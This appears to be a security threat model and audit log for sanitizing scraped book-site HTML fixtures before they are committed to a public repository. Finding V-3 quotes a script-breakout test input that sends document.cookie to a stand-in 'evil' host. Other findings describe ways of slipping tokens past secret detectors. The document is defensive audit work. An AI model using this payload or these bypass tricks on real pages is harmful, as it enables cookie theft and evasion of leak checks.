# Threat Model - Real-HTML Mock Test Corpus (task 06.0) - 2026-09-30

Written before coding starts, per the security-auditor merge gate. Scope: capturing LIVE, sanitizing, and
committing HTML/JSON fixtures from Amazon, Packtpub, Leanpub, O'Reilly (headless Chromium + httpx), a fixture-serving
Chromium/httpx harness, golden tests, edge-case + hand-built fallbacks, and a refresh/drift workflow.

## Assets & trust boundaries

- **Assets:** the machine's browser identity (any logged-in session cookies, `storage_state`, Chrome profile), the
  user's account/email/PII, and the integrity of `git` history (fixtures are committed forever — a leak is
  irreversible once pushed).
- **Boundary 1 (capture):** untrusted, possibly hostile third-party HTML/JSON (including bot-wall pages) enters the
  machine via headless Chromium + httpx, is sanitized, then crosses into the repo / git history. This is the
  dominant boundary: an over-broad capture writes real secrets into permanent history.
- **Boundary 2 (test runtime):** the fixture-serving harness runs production `scrape_book` /
  `get_leanpub_book_details` against committed bytes in real Chromium. It must be fully offline; any real request is
  a boundary violation (live scraping from CI, IP disclosure, non-determinism).
- **Trust posture:** every captured page is hostile input. The secret-scan patterns
  (`.claude/skills/secret-scan/references/pattern-catalog.md`, engine `.claude/hooks/secret_scan.py`) match only
  vendor *credential shapes* (AKIA, sk-ant-, ghp_, PEM, postgres DSN, keyword-assigned literals). They do **not**
  match cookies, session/CSRF tokens, JWTs, tracking IDs, signed-URL params, or emails-in-markup — so `assert_clean`
  reusing them is necessary but far from sufficient.

## Findings

### [CRITICAL] FIX-1 (01) Capture must run in a fresh, logged-out, cookie-less ephemeral context
- Vector / evidence: subtask 01 says capture reuses "the **same** context factory ... as the scraper." If that
  factory ever carries `storage_state`, a `user_data_dir`, a persistent context, or the user's real Chrome profile,
  session cookies / account tokens / PII are captured into `page.content()` and committed to history.
- Impact: irreversible leak of live session credentials and PII into git.
- Mitigation: launch a fresh `browser.new_context()` with no `storage_state` / no `user_data_dir` / no persistent
  profile; assert `context.cookies()` is empty and `storage_state` has no origins immediately before `page.content()`;
  abort the capture (no file written) otherwise. Record `logged_out: true` in `.meta.json` (FIX-14). CWE-200, CWE-539.

### [CRITICAL] FIX-2 (01) `assert_clean` must be fail-closed and extended beyond credential shapes
- Vector / evidence: subtask 01 defines `assert_clean` as reusing the secret-scan patterns, which are
  vendor-credential-shaped only; cookies/session/CSRF/JWT/tracking IDs pass them silently.
- Impact: the last gate before commit lets non-credential secrets through.
- Mitigation: run `assert_clean` on the final sanitized HTML/JSON **and** on `.meta.json`; any sanitizer/parse
  exception aborts the capture with no partial write; not bypassable by `--force`; extend detectors with
  corpus-specific patterns for `Set-Cookie`/cookie echoes, session/CSRF token values, bearer/JWT (`eyJ...`),
  signed-URL params, and email addresses. Also run `/secret-scan tests/fixtures/` in CI as a standing gate.
  CWE-200, OWASP A09.

### [CRITICAL] FIX-8 (03) Harness must be default-deny offline: abort + fail-test on any unmapped request
- Vector / evidence: subtask 03 requires "aborts everything else and records it ... fails the test." Any fall-through
  to `route.continue_()` for an unmapped URL, or an httpx path not routed through `MockTransport`, makes a real
  network request from tests/CI.
- Impact: live scraping from CI (IP/geo disclosure, ToS exposure, flaky/non-deterministic tests, possible
  credential use if env is present).
- Mitigation: Playwright `route("**/*")` and httpx `MockTransport` abort every URL not in the normalized mapping
  (including every dotted third-party host and `/robots.txt` when no fixture exists), record it, and fail the test at
  teardown with the URL list. Add a test that an unmapped request fails the test. CWE-918 (defense-in-depth).

### [HIGH] FIX-3 (01) `strip_secrets` must cover logged-out-page identity/tracking data, and data-* not size-gated only
- Vector / evidence: subtask 01 strips hidden-input values, csrf/token/session attrs+meta, emails, and only
  `data-*` **over 200 chars**. Short `data-*` (customer/session/ubid/csm/A-B bucket) and cookie-echo-into-HTML slip
  through.
- Impact: session-id, customer-id, A/B-test bucket, geo/IP hints, tracking IDs committed.
- Mitigation: strip known-sensitive `data-*` names (`data-*session*`, `*csrf*`, `*token*`, `*uid*`, `*ubid*`,
  `*customer*`, `*csm*`) regardless of length, in addition to the >200-char opaque-blob rule; strip cookie echoes and
  geo/IP/A-B meta tags. CWE-200.

### [HIGH] FIX-4 (01) ld+json and inline JSON state blobs must be sanitized, not kept verbatim
- Vector / evidence: subtask 01 keeps `<script type="application/ld+json">` "which may hold metadata worth keeping."
  ld+json and other inline state blobs routinely carry signed image URLs, breadcrumb/account data, and tracking IDs.
- Impact: PII / signed URLs / tracking IDs survive inside kept JSON.
- Mitigation: parse kept ld+json and run it through `sanitize_json` recursively (redact email/token/session/password
  and signed-URL/tracking fields) before re-embedding; remove all non-ld+json `<script>` state blobs; add a test
  asserting no `<script>` other than sanitized ld+json survives. CWE-200.

### [HIGH] FIX-5 (01) `strip_tracking` param list is incomplete for signed URLs and session hints
- Vector / evidence: subtask 01 strips only `ref=/tag=/pd_rd_*/pf_rd_*/qid=/sr=/crid=`; omits signed-URL and
  session params.
- Impact: presigned URLs (still valid until expiry) and session identifiers committed via `href/src/srcset/action`
  and ld+json URLs.
- Mitigation: also strip/rewrite `X-Amz-Signature`/`X-Amz-Credential`/`X-Amz-Security-Token`/`X-Amz-Expires`,
  CloudFront `Signature`/`Key-Pair-Id`/`Policy`, `session-id`, `sid`, `smid`, `csm-hit`; apply to
  `href/src/srcset/action` and to URL fields inside ld+json. CWE-200, CWE-598.

### [HIGH] FIX-6 (01/06) Hand-built / bot-wall / "derived" fixtures must pass the identical sanitize+assert_clean pipeline
- Vector / evidence: README and subtask 06 allow a hand-built fixture when a site bot-walls, and "derived" edge cases.
  A fixture that bypasses the sanitizer is an unguarded commit path.
- Impact: a manually pasted snapshot could carry secrets the live path would have stripped.
- Mitigation: every fixture (live, hand-built, derived) runs the same `sanitize` + `assert_clean`; record
  `hand_built: true` / `derived_from` in meta; subtask 02's `test_meta_sha256_matches_file` guards post-capture hand
  edits. CWE-200.

### [HIGH] FIX-7 (01/07) robots.txt and refresh fetches are logged-out, unauthenticated, and sanitized
- Vector / evidence: subtasks 01/07 fetch `/robots.txt` and re-capture via httpx.
- Impact: an authenticated or proxy-credentialed fetch could embed identity; robots content committed unsanitized.
- Mitigation: httpx fetches send no auth headers/cookies and use no user proxy/env credentials; fetched robots is
  sanitized + `assert_clean`'d like any fixture. Policy note: the ratified handful-of-pages capture should honor each
  site's robots (see decisions).

### [MEDIUM] FIX-9 (03) Corpus route precedence must not create an unknown-host bypass for documents
- Vector / evidence: subtask 03 installs the corpus route after production `route_handler` so it wins, but
  `route_handler` calls `route.continue_()` for documents.
- Impact: a document request to an unmapped host could reach the network if precedence is wrong.
- Mitigation: verify the corpus route runs first (test present) and additionally assert an unmapped *document*
  request is aborted+failed, not continued.

### [MEDIUM] FIX-10 (04/07) Fixture/golden writes must never be silently green; `--apply`/`--force` gate all overwrites
- Vector / evidence: subtask 04 `--update-goldens`, subtask 07 `--refresh`/`--apply`, subtask 01 `--force`.
- Impact: an unreviewed overwrite could launder a regression or a newly-leaked secret into the corpus.
- Mitigation: `--update-goldens` rewrites then **fails** the run ("goldens updated - review the diff"); `--refresh`
  alone writes only to a temp dir; `--apply` is the only path that writes into `tests/fixtures/` and must re-run
  sanitize + `assert_clean` before writing; capture refuses to overwrite without `--force`. This is the
  "automation proposes, human decides" boundary. CWE-494.

### [MEDIUM] FIX-11 (01/02) Bound memory/parse work on hostile capture input (DoS)
- Vector / evidence: capture reads `page.content()` / httpx bodies from adversarial bot-wall pages; sanitizer parses
  attacker-controlled HTML.
- Impact: decompression bomb or deeply-nested markup exhausts memory during capture.
- Mitigation: enforce the 400 KB/file and 15 MB/corpus budgets at capture time (not only in a later test); cap the
  in-memory body/`page.content()` read; bound httpx auto-decompression; bounded HTML parsing (no unbounded recursion).
  CWE-400, CWE-409.

### [MEDIUM] FIX-12 (02) Licensing/copyright policy for committing third-party HTML/JSON — DECISION REQUIRED
- Vector / evidence: subtask 02 commits sanitized Amazon/Packtpub/Leanpub/O'Reilly markup to the repo.
- Impact: committing third-party content (esp. if the repo is public) may exceed fair-use/interoperability and breach
  site ToS.
- Mitigation: `tests/fixtures/README.md` states the interoperability-testing (not redistribution) rationale,
  "minimum needed," and the 400 KB/15 MB caps. Flagged as a **policy note requiring the user's/legal decision**, not a
  code gate.

### [LOW] FIX-13 (02) `-diff` gitattributes must not hide a review bypass
- Vector / evidence: subtask 02 marks `*.html` `linguist-generated -diff`.
- Impact: a secret slipped into an HTML fixture would not show in the PR diff.
- Mitigation: compensating controls — `test_meta_sha256_matches_file`, CI `/secret-scan tests/fixtures/`, and goldens
  (`*.expected.json`) staying diffable.

### [LOW] FIX-14 (all) Audit metadata proving logged-out capture and sanitizer version
- Vector / evidence: subtask 01 `.meta.json` fields.
- Impact: no record of how/whether a fixture was sanitized or captured logged-out.
- Mitigation: add `logged_out: true` and `sanitizer_version` to `.meta.json` alongside the required fields; this is
  the audit trail for boundary 1. OWASP A09.

## Verdict: PASS_WITH_FOLLOWUP

No code exists yet, so nothing is presently exploitable. However FIX-1, FIX-2, and FIX-8 are **merge-blocking
acceptance gates**: if the delivered implementation does not satisfy all three, this verdict flips to **BLOCK** and
the change must stay out of `master`. FIX-12 requires a user/legal decision before the corpus is committed.

## Verification - subtask 01 sanitizer sign-off (2026-09-30)

Adversarial review of `src/bookscraper/scraping/sanitize.py` and `scripts/capture_fixtures.py` against
FIX-1..7, 11, 14 and the ratified corpus policy (public repo, prose neutralized, capture not robots-gated).
Every input below was executed against the real code. Secret *values* are described by shape, never quoted.

**Verdict: SIGN-OFF WITHHELD.** No CRITICAL, but three HIGH bypasses of the capture->git boundary must be
fixed and re-reviewed before any live capture is committed. This does not by itself flip the task threat
model to BLOCK (no live capture has run; nothing is in git yet), but the sanitizer rules are not signed off.

### [HIGH] V-1 `assert_clean` allowlist disables the FIX-2 gate on ordinary lines
- Vector (`sanitize.py:872-890`, used at `:907`): `_is_placeholder_line` does a substring test of each line
  against `_ALLOWLIST`, which contains `"test"` (and `"example"`, `"fake"`). Any line containing a common
  substring - `latest`, `greatest`, `fastest`, `test`, `contest` - skips ALL detectors.
- Evidence: `assert_clean('<a href="/latest">Latest</a> session-id=<sess> X-Amz-Signature=<sig>')` PASSES;
  `assert_clean('our test build key AKIA<16> deploy')` PASSES.
- Impact: the designated FIX-2 fail-closed backstop is silently off on a large fraction of real book-page
  lines (all four sites use these words), so anything the positive sanitizers miss can ride through.
- Mitigation: match allowlist tokens on word boundaries and/or require the placeholder token to be adjacent
  to the match, not anywhere on the line; drop `"test"` as a bare substring token. CWE-697.

### [HIGH] V-2 Token/JSON in a non-sensitive-named `data-*` under 200 chars survives sanitize + assert_clean
- Vector (`sanitize.py:604-656`; name regex `:606`, length gate `:652`): `data-*` is dropped only when the
  NAME matches `session|csrf|token|uid|ubid|customer|csm` or the value is >200 chars. A hydration blob like
  `data-state='{"authToken":"<24ch>"}'` / `data-config='{"sid":"<12ch>"}'` (Amazon-style `data-a-state`
  included) has neither trait; the value is never JSON-parsed, so `_JSON_REDACT_KEY_RE` never sees it.
- Evidence: both `authToken` and `sid` values are present verbatim in `sanitize_html` output and
  `assert_clean` PASSES (the escaped `&quot;` breaks the "generic assigned secret" and session-value regexes).
- Impact: a real session/tracking token in a short state attribute is committed to permanent public git -
  the dominant Boundary-1 leak FIX-3 was meant to close, only partially closed.
- Mitigation: JSON-parse and `sanitize_json` any `data-*`/`data-a-*` value that looks like JSON regardless of
  length; expand the sensitive-name set (`*state*`, `*config*`, `*props*`, `*auth*`); or drop all `data-*`
  not on an explicit keep list. CWE-200.

### [HIGH] V-3 ld+json re-embed is not output-encoded: `</script>` escapes the rawtext element
- Vector (`sanitize.py:796-816`, `json.dumps(...ensure_ascii=False)` at `:815`, emitted verbatim as rawtext
  at `:179-182`): a kept ld+json string value containing `</script><script>...` is re-serialized literally
  inside the `<script>` element. `json.dumps` does not escape `<` or `/`.
- Evidence: input ld+json `{"name":"X</script><script>fetch('//evil?c='+document.cookie)</script>"}` yields
  output containing a live `</script><script>...</script>` sequence; on reparse this closes the ld+json blob
  and injects an executing script. Serialization does NOT re-escape safely here (the task's reparse check
  fails for rawtext).
- Impact: breaks the "only sanitized ld+json survives as script" invariant; injects attacker-controlled
  script into a committed fixture that the offline harness (Boundary 2) loads in real Chromium. Integrity /
  stored-XSS into the corpus.
- Mitigation: escape `</` (or `<`) in the re-embedded JSON (e.g. replace `<` with `<`), or emit ld+json
  as HTML-escaped text rather than rawtext. CWE-116, CWE-79.

### [MEDIUM] V-4 Secret/email/token split across sibling text nodes bypasses assert_clean
- Vector (`sanitize.py`: `assert_clean` is line/serialization-based `:906`; `_replace_emails` runs on the
  serialized string `:615`; text nodes are never concatenated before scanning): `<span>eyJ...</span><span>.eyJ...</span>`
  or `jane<span>@</span>corp-real.com` reassembles in the rendered DOM but not in the scanned bytes.
- Evidence: JWT-in-three-spans and email-around-a-span both survive `sanitize_html` and PASS `assert_clean`.
- Impact: a hostile bot-wall (pages are hostile per the threat model) can smuggle a token/email past the gate.
- Mitigation: also run the extended detectors against the whitespace-normalized text content of the parsed
  tree (not just the serialized string). CWE-116.

### [MEDIUM] V-5 Prose chunked under 200 chars across non-prose siblings escapes neutralization
- Vector (`sanitize.py:706-719`, threshold `:716`): a text node is neutralized only if it alone exceeds
  `PROSE_MAX_CHARS` or sits in a prose-named container. Prose split into <200-char sibling `<span>`s with no
  description/review/etc. class stays verbatim.
- Evidence: three 180-char sibling spans of marketing copy survive with no `PROSE_PLACEHOLDER`.
- Impact: copyrighted long-form text reaches the public repo, contrary to the ratified prose policy (FIX-12).
- Mitigation: also neutralize on the aggregate collapsed text length of an element's direct text children.

### [LOW] V-6 Opaque blob in an inline `style="...url(data:...)"` attribute is never gated
- Vector (`sanitize.py:641-655`): only `data-*` attributes are length/name-gated; a `style` attribute with a
  300-char base64 `url(data:...)` passes untouched. Low value as a secret channel but unbounded and opaque.
- Mitigation: apply the >200-char opaque-value drop to `style` (and other non-keep attributes) too. CWE-200.

### [LOW] V-7 Namespaced `<svg:script>` is not stripped
- Vector (`sanitize.py:557-560`): `should_remove` matches `el.tag == "script"`, so `<svg:script>` survives.
  Exotic and non-executing when reparsed as HTML, but it is an unstripped script-shaped element.
- Mitigation: match any tag ending in `:script`/`script` and known script-carriers.

### Confirmed-correct (no bypass)
- Entity-encoded email `&#64;` -> decoded by `convert_charrefs=True`, replaced by `_replace_emails`. PASS.
- HTML comment carrying a token -> `HTMLParser` drops comments entirely (no `handle_comment`); gone. PASS.
- `<meta http-equiv="set-cookie">` -> `_is_sensitive_meta` matches `cookie`; element dropped. PASS.
- Plain `<svg><script>` -> removed. PASS. `srcset` multi-descriptor signed params -> all stripped. PASS.
- Uppercase param names (`REF`, `Session-Id`, `X-AMZ-SIGNATURE`) -> case-insensitive strip works. PASS.
- Parser depth bound (`MAX_TREE_DEPTH=200`) caps tree nesting so every recursive pass is bounded (FIX-11);
  `sanitize_json` depth cap returns leaf past `MAX_JSON_DEPTH`. PASS.
- Capture FIX-1: `_assert_logged_out` runs at `capture_fixtures.py:134` immediately before `page.content()`
  at `:135`; a dirty context raises `CaptureError` before content is read and before `_write_fixture`, so no
  file is written. PASS. FIX-11 per-file 400 KB budget (`:220`) and 8 MB httpx body cap (`:158`) enforced.

### Follow-ups (not blocking, for python-expert / testing-expert)
- FIX-11 gap: the 15 MB/corpus budget is not enforced at capture time (only per-file), and `page.content()`
  for the browser path is not size-capped before sanitize (only the httpx body is). LOW.

## Re-review - subtask 01 sanitizer fixes (2026-09-30, round 2)

Re-ran the round-1 harness against the fixed working tree: **all of V-1..V-7 and the FIX-11 capture caps are
closed** (V-1 raises with no substring allowlist; V-2 data-* values dropped/JSON-redacted; V-3 breakout
`<`-encoded and stray scripts stripped; V-4 split-node token/email raises via the concatenated-text scan;
V-5 chunked prose collapses on aggregate text; V-6 opaque `style` dropped; V-7 `svg:script` removed). V-5 does
NOT over-neutralize factual fields (title/ISBN/date/author all survive with the real amazon keep-selectors), and
assert_clean shows **no false positives** on realistic benign text (ISBNs, prices, ASINs, long numeric IDs,
base64-ish cover ids) - legitimate captures are not blocked.

New probes against the fixed code found narrower residuals (none CRITICAL/HIGH):

### [MEDIUM] R-1 `assert_clean` generic-secret exemption is substring/shape-fuzzy (mini-V-1)
- Vector (`sanitize.py:971-978`, esp. `:977`): a "Generic assigned secret" hit is exempted when the captured
  value merely *contains* `"REDACTED"` or matches `^<...>$`. `token="REDACTED<opaque>"` survives the FULL html
  pipeline and PASSES assert_clean (confirmed end-to-end). The angle form is escaped away on the HTML path but
  still exempts on non-HTML paths (meta/api JSON where `<` stays literal).
- Impact: a hostile page can prefix its payload with `REDACTED` to slip a `key="value"` secret past the final
  gate. Narrow (attacker-controlled shape; real user credentials won't carry `REDACTED`), so backstop hygiene.
- Mitigation: exempt only on exact equality to an emitted placeholder value; drop the `"REDACTED" in value`
  substring and the generic angle-match. CWE-697.

### [MEDIUM] R-2 JSON-in-`data-*` still leaks opaque values (V-2 residual: value-blind redaction)
- Vector (`sanitize.py:688-694` -> `sanitize_json` `:832-864`): `_sanitize_json_attr` inherits sanitize_json's
  **key-name-only** redaction. Under a non-sensitive attribute name (`data-hydration`, `data-x`), these survive
  the full pipeline + assert_clean: (a) a token nested as a JSON *string* `{"inner":"{\"apikey\":\"...\"}"}`
  (inner never re-parsed); (b) a bare array `["<tok>","<tok>"]`; (c) a token under a generic key
  `{"id":"<tok>","value":"<tok>"}`. HTML-escaped JSON *is* handled correctly (parsed then key-redacted).
- Impact: a real session/tracking id under an innocuous key in an innocuous-named data-* reaches public git -
  the same FIX-3 class the fix mostly closed. Mirrors the accepted opaque-value limit on API bodies.
- Mitigation: after JSON-sanitizing a `data-*` value, also drop/redact it if the re-serialized blob still
  exceeds the opaque-length gate, or redact string values that look like high-entropy opaque tokens regardless
  of key. CWE-200.

### [MEDIUM] R-3 V-4 concatenated-text scan is defeated by any intervening whitespace (incl. invisible U+2028)
- Vector (`sanitize.py:383-399` and `:1005-1007`): `assert_clean` scans line-by-line (`splitlines()` also
  breaks on U+2028/U+2029) plus the normalized text content (`" ".join(text.split())`, where U+2028/U+2029/tab
  count as whitespace). A JWT/token split by a space or an invisible U+2028 inside/between text nodes
  (`eyJ... .eyJ...`) survives sanitize_html and PASSES both scans - the whitespace inserts a gap that
  breaks the contiguous pattern.
- Impact: an invisible-separator split lets a hostile page smuggle a token-shaped value past the backstop while
  it still reads as one token to a human. Adversarial; the round-1 no-whitespace split is now correctly caught.
- Mitigation: additionally scan a whitespace-stripped variant of the text content, or normalize U+2028/U+2029
  out before scanning. CWE-116.

### [LOW] R-4 Over-broad email-domain exemption; retina `@2x` filename rewrite
- Vector (`sanitize.py:968` used at `:974`): `_EXAMPLE_EMAIL_RE` exempts any address ending
  `@<anything>example.(invalid|com|net|org)`, so `steal@evilexample.com` PASSES assert_clean. Moot on every
  payload path (all run `_replace_emails` first, which rewrites real emails regardless of domain), so this only
  weakens the independent backstop and the meta/URL edge. Separately, `_EMAIL_RE` rewrites retina filenames like
  `sprite@2x.png` to the email placeholder - a cosmetic fixture-correctness issue, not a leak.
- Mitigation: exempt only `EMAIL_PLACEHOLDER` exactly (plus RFC-2606 reserved `@example.{com,net,org,invalid}`
  with a dot boundary); require a non-`@2x`-style local part before rewriting.

### Verdict (round 2): SIGN-OFF WITH FOLLOWUP
All round-1 HIGH bypasses and the FIX-1/FIX-2/FIX-8 acceptance gates are satisfied; the task threat model stays
**PASS_WITH_FOLLOWUP** (not BLOCK). The four residuals above are MEDIUM/LOW (adversarial or backstop-only, or
mirroring the accepted API-body opaque-value limit) and should be closed with the first real capture, R-2 first.

## Verification - task 06.0 close (2026-10-02)

Task-close review of the committed corpus and pipeline on `milestone/0001-generic-implementation`
(`git diff 4eaa652..HEAD`), repo PUBLIC (`yuchdev/BookScraper`). Sanitizer is v1.1.0. Covers the four
post-sign-off sanitizer changes (`abde322` segment key-redaction + 80-char floor; `4fc97d9` text-only
neutralization keep-structure/keep-text; `8972900` `dib`/token-shaped URL-param stripping; capture
`_trim_repeated_blocks` / `_strip_subresources`). Harnesses `attack.py` / `attack2.py` re-run against
current code. Secret values described by shape, never quoted.

**Verdict: PASS.** No CRITICAL, HIGH, or MEDIUM. All prior round-1/round-2 bypasses (V-1..V-7, R-1..R-4)
are closed in the committed code, the three CRITICAL acceptance gates (FIX-1/2/8) hold, and the 103-file
committed corpus is clean under three independent scans. One LOW/informational note (ephemeral per-render
Amazon correlation IDs) is non-identity and non-blocking.

### Corpus scans (committed `tests/fixtures/`, 103 files)
- `.claude/hooks/secret_scan.py` over every file: **clean**, 0 flagged.
- `sanitize.assert_clean` over every payload AND every `.meta.json`: **0 failures / 103 files**.
- Heuristic scan (emails, signed-URL params, session/csrf/cookie/token attrs, IPs, geo, A/B IDs,
  Amazon `ue_sid`/`ue_mid`/`session-id`/`ubid-main` customer IDs, JWTs, opaque attr values >=40ch,
  text nodes >200ch not placeholder): **no leaks**. Specifically confirmed:
  - `session-id` / `anti-csrftoken-a2z` hidden inputs present only with `value=""` (values stripped).
  - `bucket` hits are CSS class names (`detail-bullets-wrapper bucket`, `bucketDivider`); `geo`/`weblab`
    hits are static capability/cache class tokens in `<html class>` (`a-geolocation`,
    `a-aui_template_weblab_cache_333406-c`) - not geolocation values or per-user A/B treatments.
  - No `ue_sid`/`ue_mid`/`ubid-main`/`x-main`/`at-main`/`session-token`/`csm-hit`/`x-amz-*` values anywhere.
  - Live detail page `a_tour_of_cpp_3e.html`: **0 `<script>` elements**, no ld+json, no opaque blobs; the
    only 40-200ch attr values are DOM ids / `ref=`-stripped href paths (static layout tokens).
  - No prose text nodes over 200 chars that aren't `PROSE_PLACEHOLDER`.

### [LOW] CL-1 Ephemeral per-render Amazon correlation IDs survive in search fixtures
- Vector / evidence: `tests/fixtures/html/amazon/search_python_p1.html` (and `p2`, `search_python_last_page`)
  carry `data-uuid="01122864-fd2d-49c6-..."` (36-char UUIDs) and `data-csa-c-id="173qnz-ujifa9-w6adqd-htngc3"`
  (~27ch) on result cards. Short (<200ch) and not in the sensitive-name set (`session|csrf|token|uid|ubid|customer|csm`),
  so the FIX-3 gate leaves them.
- Impact: none to identity. Capture was logged-out (FIX-1, `logged_out: true` in all 38 metas); these are
  client-side click-stream component correlation IDs regenerated each page load, not user/session/customer IDs.
  They add non-determinism noise to the fixtures but leak nothing. CWE-200 (informational).
- Mitigation (optional, non-blocking): add `data-uuid`/`data-csa-c-id` to the capture's zeroed-attr list, or
  gate opaque `data-*` values at a lower length. Hand to `python-expert` only if corpus cleanliness is wanted.
- RESOLVED (2026-10-02, sanitizer v1.2.0): `strip_secrets` now drops `data-uuid` and the `data-csa-c-*` family
  by name regardless of length (`_is_correlation_data_attr`); `data-asin` (`SEARCH_ASIN_ATTRIBUTE`) is preserved.
  The four affected fixtures (`a_tour_of_cpp_3e`, `search_python_p1`/`p2`/`last_page`) were re-sanitized over their
  existing bytes (sanitize is idempotent — second pass byte-identical) and their `.meta.json`
  sha256/bytes_sanitized/sanitizer_version updated; search goldens unchanged.

### FIX one-liners (as committed)
- FIX-1 (CRITICAL) PASS - `_assert_logged_out` runs immediately before `page.content()`; all 38 metas record `logged_out: true`.
- FIX-2 (CRITICAL) PASS - `assert_clean` runs on payload AND meta at the only write path (`_write_fixture:460-461`), not `--force`-bypassable; extended detectors (cookie/session/CSRF/JWT/signed-URL/email) verified live.
- FIX-3 (HIGH) PASS - hidden-input/session/csrf values stripped to empty; short/JSON `data-*` dropped or JSON-redacted (attack.py #2, attack2.py B1/B2/B2c/B3). Residual CL-1 (LOW).
- FIX-4 (HIGH) PASS - no non-ld+json scripts survive; live detail page has 0 `<script>`; `</script>` breakout `<`-encoded (attack.py #3, attack2.py C1).
- FIX-5 (HIGH) PASS - `X-Amz-*`/CloudFront/`session-id`/`sid`/`smid` + `dib`/token-shaped params stripped from href/src/srcset (attack.py #10/#11); no signed-URL params in corpus.
- FIX-6 (HIGH) PASS - hand-built/derived fixtures run the same sanitize+assert_clean; `--apply` refuses to overwrite a hand-built fixture with a walled page; `test_meta_sha256_matches_file` guards hand edits.
- FIX-7 (HIGH) PASS - robots fetched logged-out/unauthenticated and sanitized; committed `robots/*.txt` are plain policy text, metas record `logged_out: true`.
- FIX-8 (CRITICAL) PASS - harness is default-deny: unmapped Playwright routes `route.abort()`, httpx `MockTransport` raises `OfflineNetworkError`, web sockets closed; teardown fails the test naming URLs; dedicated tests assert an unmapped request fails.
- FIX-9 (MEDIUM) PASS - corpus route re-appended after production `route_handler` at page AND context level; `test_harness_takes_precedence_over_production_route_handler` + context variant prove no document falls through to `continue_()`.
- FIX-10 (MEDIUM) PASS - `--refresh` writes only to a `mkdtemp` temp dir; `--apply` is the sole in-tree write path and re-runs `sanitize`+`assert_clean`+budgets via `_write_fixture`; `--apply` without `--refresh` errors; capture refuses overwrite without `--force`.
- FIX-11 (MEDIUM) PASS - per-file 400KB and whole-corpus 15MB budgets enforced at capture (`_write_fixture`); browser DOM snapshot and httpx body size-capped before sanitize; parser depth bound 200.
- FIX-12 (MEDIUM) PASS (policy) - `tests/fixtures/README.md` states interoperability-testing rationale, "minimum needed," and the caps; a_tour raw 1.95MB -> 37KB sanitized.
- FIX-13 (LOW) PASS - `*.html -diff` compensated by `test_meta_sha256_matches_file`, CI secret-scan, and diffable `*.expected.json` goldens.
- FIX-14 (LOW) PASS - every meta carries `logged_out: true` and `sanitizer_version: "1.1.0"`.
